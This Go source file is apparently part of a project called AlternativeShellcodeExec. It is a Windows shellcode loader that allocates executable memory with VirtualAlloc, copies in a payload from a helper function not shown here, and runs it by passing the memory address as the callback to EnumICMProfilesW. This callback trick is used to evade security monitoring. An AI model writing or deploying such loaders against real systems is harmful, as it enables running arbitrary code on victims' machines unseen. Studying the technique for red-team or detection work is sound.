package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// Allocate memory to store op
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		panic("VirtualAlloc failed")
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], op)

	// Use EnumICMProfilesW to call the shellcode
	user32, _ := syscall.LoadDLL("user32.dll")
	getDC, _ := user32.FindProc("GetDC")
	dc, _, _ := getDC.Call(0)
	if dc == 0 {
		println("Error GetDC")
		return
	}

	gdi32, _ := syscall.LoadDLL("gdi32.dll")
	enumICMProfilesW, err := gdi32.FindProc("EnumICMProfilesW")
	if err != nil {
		fmt.Println("Error EnumICMProfilesW", err)
		return
	}
	ret, _, err := enumICMProfilesW.Call(dc, addr, 0)
	//if err != nil {
	//	fmt.Println("Error EnumICMProfilesW call", err)
	//	return
	//}
	if ret == 0 {
		println("EnumICMProfilesW failed:", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
